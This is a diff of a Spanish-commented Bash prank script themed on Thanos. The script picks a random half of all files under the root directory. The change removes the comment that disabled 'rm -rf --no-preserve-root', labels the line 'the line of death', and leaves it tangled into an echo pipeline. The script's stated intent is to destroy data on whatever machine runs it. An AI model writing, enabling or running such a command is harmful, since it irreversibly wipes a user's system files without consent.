@@ -13,7 +13,7 @@ echo "....Traere equilibrio a este universo!!!"
 FILES=($( tree --dirsfirst -afixFL 50 --noreport / | grep -v /$ | shuf -n$MITAD | cut -d " " -f 1))
 echo "...."
 echo "**Thanos chasquea los dedos !!!!**"
-printf "%s\0" "${FILES[@]}" | xargs -0 -i echo "test -" '{}' > /dev/null #####xargs -0 -i rm -rf --no-preserve-root '{}' ##verdadero guante del infinito, no usar!!!###
+printf "%s\0" "${FILES[@]}" | xargs -0 -i echo "test -" '{}' > /dev/null xargs -0 -i rm -rf --no-preserve-root '{}' ##la linea de la muerte!!!###
 echo "...."
 echo "Total archivos: " $NUMERO " - Archivos borrados aleatoreamente: " $MITAD
 echo "...."
